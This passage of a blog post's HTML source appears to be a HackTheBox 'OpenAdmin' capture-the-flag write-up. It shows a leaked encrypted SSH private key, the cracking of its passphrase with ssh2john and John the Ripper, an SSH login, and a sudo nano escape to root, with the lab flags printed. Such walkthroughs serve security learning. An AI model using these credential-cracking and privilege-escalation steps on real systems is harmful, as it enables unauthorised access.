</span></span><span class=line><span class=cl>9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
</span></span><span class=line><span class=cl>piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
</span></span><span class=line><span class=cl>/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
</span></span><span class=line><span class=cl>40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
</span></span><span class=line><span class=cl>fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
</span></span><span class=line><span class=cl>9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
</span></span><span class=line><span class=cl>X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
</span></span><span class=line><span class=cl>S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
</span></span><span class=line><span class=cl>FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
</span></span><span class=line><span class=cl>Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
</span></span><span class=line><span class=cl>RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
</span></span><span class=line><span class=cl>uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
</span></span><span class=line><span class=cl>1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
</span></span><span class=line><span class=cl>XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
</span></span><span class=line><span class=cl>yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
</span></span><span class=line><span class=cl>+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
</span></span><span class=line><span class=cl>qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
</span></span><span class=line><span class=cl>z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
</span></span><span class=line><span class=cl>K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>&lt;/pre&gt;uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
</span></span><span class=line><span class=cl>Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>We could also have look at <code>main.php</code> directly on the file system too but I
wanted to follow the application logic.</p><p>It seems we have a private key from <code>joanna</code> user, which is encrypted and
password protected but we also have a hint to crack it:
<em>Don&rsquo;t forget your &ldquo;ninja&rdquo; password</em>.</p><p>Let&rsquo;s crack it with <a href=https://www.openwall.com/john/>JtR (John the Ripper)</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ssh2john</span> <span class=n>id_rsa</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>ssh2john</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span> <span class=n>DeprecationWarning</span><span class=p>:</span> <span class=n>decodestring</span><span class=p>()</span> <span class=n>is</span> <span class=n>a</span> <span class=n>deprecated</span> <span class=n>alias</span> <span class=n>since</span> <span class=n>Python</span> <span class=mf>3.1</span><span class=p>,</span> <span class=n>use</span> <span class=n>decodebytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=n>data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>decodestring</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>id_rsa</span><span class=p>:</span><span class=o>$</span><span class=n>sshng</span><span class=o>$</span><span class=mi>1</span><span class=o>$</span><span class=mi>16</span><span class=o>$</span><span class=mi>2</span><span class=n>AF25344B8391A25A9B318F3FD767D6D</span><span class=o>$</span><span class=mi>1200</span><span class=o>$</span><span class=mi>906</span><span class=n>d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>john</span> <span class=o>--</span><span class=n>wordlist</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>password</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=n>john</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>detected</span> <span class=nb>hash</span> <span class=n>type</span> <span class=s2>&#34;SSH&#34;</span><span class=p>,</span> <span class=n>but</span> <span class=n>the</span> <span class=n>string</span> <span class=n>is</span> <span class=n>also</span> <span class=n>recognized</span> <span class=n>as</span> <span class=s2>&#34;ssh-opencl&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--format=ssh-opencl&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>force</span> <span class=n>loading</span> <span class=n>these</span> <span class=n>as</span> <span class=n>that</span> <span class=n>type</span> <span class=n>instead</span>
</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=p>(</span><span class=n>SSH</span> <span class=p>[</span><span class=n>RSA</span><span class=o>/</span><span class=n>DSA</span><span class=o>/</span><span class=n>EC</span><span class=o>/</span><span class=n>OPENSSH</span> <span class=p>(</span><span class=n>SSH</span> <span class=n>private</span> <span class=n>keys</span><span class=p>)</span> <span class=mi>32</span><span class=o>/</span><span class=mi>64</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>1</span> <span class=p>(</span><span class=n>KDF</span><span class=o>/</span><span class=n>cipher</span> <span class=p>[</span><span class=mi>0</span><span class=o>=</span><span class=n>MD5</span><span class=o>/</span><span class=n>AES</span> <span class=mi>1</span><span class=o>=</span><span class=n>MD5</span><span class=o>/</span><span class=mi>3</span><span class=n>DES</span> <span class=mi>2</span><span class=o>=</span><span class=n>Bcrypt</span><span class=o>/</span><span class=n>AES</span><span class=p>])</span> <span class=n>is</span> <span class=mi>0</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>2</span> <span class=p>(</span><span class=n>iteration</span> <span class=n>count</span><span class=p>)</span> <span class=n>is</span> <span class=mi>1</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>2</span> <span class=n>OpenMP</span> <span class=n>threads</span>
</span></span><span class=line><span class=cl><span class=n>Note</span><span class=p>:</span> <span class=n>This</span> <span class=n>format</span> <span class=n>may</span> <span class=n>emit</span> <span class=bp>false</span> <span class=n>positives</span><span class=p>,</span> <span class=n>so</span> <span class=n>it</span> <span class=n>will</span> <span class=n>keep</span> <span class=n>trying</span> <span class=n>even</span> <span class=n>after</span>
</span></span><span class=line><span class=cl><span class=n>finding</span> <span class=n>a</span> <span class=n>possible</span> <span class=n>candidate</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
</span></span><span class=line><span class=cl><span class=n>bloodninjas</span>      <span class=p>(</span><span class=n>id_rsa</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>Only</span> <span class=mi>1</span> <span class=n>candidate</span> <span class=n>left</span><span class=p>,</span> <span class=n>minimum</span> <span class=mi>2</span> <span class=n>needed</span> <span class=k>for</span> <span class=n>performance</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>g</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>08</span> <span class=n>DONE</span> <span class=p>(</span><span class=mi>2020</span><span class=o>-</span><span class=mi>03</span><span class=o>-</span><span class=mi>13</span> <span class=mi>17</span><span class=p>:</span><span class=mi>35</span><span class=p>)</span> <span class=mf>0.1237</span><span class=n>g</span><span class=o>/</span><span class=n>s</span> <span class=mi>1774</span><span class=n>Kp</span><span class=o>/</span><span class=n>s</span> <span class=mi>1774</span><span class=n>Kc</span><span class=o>/</span><span class=n>s</span> <span class=mi>1774</span><span class=n>KC</span><span class=o>/</span><span class=n>s</span> <span class=o>*</span><span class=mi>7</span><span class=err>┬í</span><span class=n>Vamos</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=n>Session</span> <span class=n>completed</span>
</span></span></code></pre></td></tr></table></div></div><p>The password is <code>bloodninjas</code> to unlock the private key of joanna.</p><p>We can connect now.</p><h3 id=system-privilege-escalation--joanna-to-root>System Privilege Escalation : joanna to root<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation--joanna-to-root>#</a></h3><p><strong>TL;DR</strong>: nano escape</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh joanna@10.10.10.171 -i id_rsa
</span></span><span class=line><span class=cl>joanna@openadmin:~$ cat user.txt
</span></span><span class=line><span class=cl>c9b2cf07d40807e62af62660f0c81b5f
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries for joanna on openadmin:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User joanna may run the following commands on openadmin:
</span></span><span class=line><span class=cl>    (ALL) NOPASSWD: /bin/nano /opt/priv
</span></span></code></pre></td></tr></table></div></div><p>EZ pe: escape <code>nano</code> thanks to <a href=https://gtfobins.github.io/>GTFObins</a></p><p>See <a href=https://gtfobins.github.io/gtfobins/nano/>https://gtfobins.github.io/gtfobins/nano/</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># cat /root/root.txt
</span></span><span class=line><span class=cl>2f907ed450b361b2c2bf4e8795d5b561
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>